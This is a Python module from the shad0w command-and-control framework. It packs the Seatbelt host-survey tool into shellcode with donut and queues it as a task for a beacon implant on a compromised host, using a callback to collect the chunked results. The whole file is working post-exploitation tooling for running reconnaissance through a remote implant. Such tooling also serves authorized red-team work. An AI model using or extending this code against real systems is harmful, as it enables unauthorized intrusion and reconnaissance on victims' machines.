#
# Execute seatbelt on a session
#

import argparse

from lib import shellcode

__description__ = "A project that performs a number of security oriented host-survey \"safety checks\""
__author__ = "@_batsec_, @harmj0y"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of seatbelt binary
SEATBELT_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/Seatbelt.exe"

# beacon to exec command on
current_beacon = None

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def seatbelt_callback(shad0w, data):
    shad0w.event.beacon_info(current_beacon, data)

    return ""

def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    seatbelt_args = ' '.join(args[1:])

    # kinda a hack to make sure we intergrate nice with the shellcode generator
    args = DummyClass()

    if len(seatbelt_args) != 0:
        args.param = seatbelt_args
    else:
        args.param = False
        seatbelt_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    b64_comp_data = shellcode.generate(SEATBELT_BIN, args, seatbelt_args)

    # dont clear the callbacks, cause the responses are chunked
    shad0w.clear_callbacks = False

    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[current_beacon]["callback"] = seatbelt_callback
